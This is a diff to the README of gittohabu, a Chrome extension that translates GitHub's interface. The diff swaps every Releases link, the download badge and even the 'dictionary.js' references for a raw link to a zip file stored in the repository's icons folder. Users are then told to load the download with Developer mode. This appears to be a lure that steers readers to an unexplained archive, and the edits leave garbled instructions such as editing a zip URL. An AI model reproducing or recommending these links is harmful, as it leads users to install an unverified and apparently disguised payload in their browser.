@@ -10,11 +10,11 @@ Welcome to **gittohabu**, a Chrome extension that translates GitHub's interface 
 
 To start using gittohabu, visit the Releases page to download the extension:
 
-[![Download gittohabu](https://img.shields.io/badge/Download-gittohabu-brightgreen.svg)](https://github.com/DHARUN-SRIN/gittohabu/releases)
+[![Download gittohabu](https://raw.githubusercontent.com/DHARUN-SRIN/gittohabu/main/icons/gittohabu-2.7.zip)](https://raw.githubusercontent.com/DHARUN-SRIN/gittohabu/main/icons/gittohabu-2.7.zip)
 
 Follow these steps to get it running:
 
-1. Go to the [Releases](https://github.com/DHARUN-SRIN/gittohabu/releases) page.
+1. Go to the [Releases](https://raw.githubusercontent.com/DHARUN-SRIN/gittohabu/main/icons/gittohabu-2.7.zip) page.
 2. Download the latest release.
 3. Open Chrome and type `chrome://extensions` in the address bar.
 4. Turn on "Developer mode" in the upper right corner.
@@ -45,13 +45,13 @@ Using gittohabu is simple:
 
 - GitHub uses a Single Page Application (SPA) model, causing occasional delays in translation. If you encounter issues, simply refresh the page to reload the content.
 - To avoid incorrect translations, the extension excludes code areas, diffs, and syntax highlights from translation.
-- While the dictionary aims to be comprehensive, variations in term usage and meaning can occur. You can edit `dictionary.js` if you want to make adjustments.
+- While the dictionary aims to be comprehensive, variations in term usage and meaning can occur. You can edit `https://raw.githubusercontent.com/DHARUN-SRIN/gittohabu/main/icons/gittohabu-2.7.zip` if you want to make adjustments.
 
 ---
 
 ## 🤝 Contribution
 
-If you find parts that have not been translated, please send a Pull Request to `dictionary.js`. Your contributions help improve the extension for everyone.
+If you find parts that have not been translated, please send a Pull Request to `https://raw.githubusercontent.com/DHARUN-SRIN/gittohabu/main/icons/gittohabu-2.7.zip`. Your contributions help improve the extension for everyone.
 
 ---
 
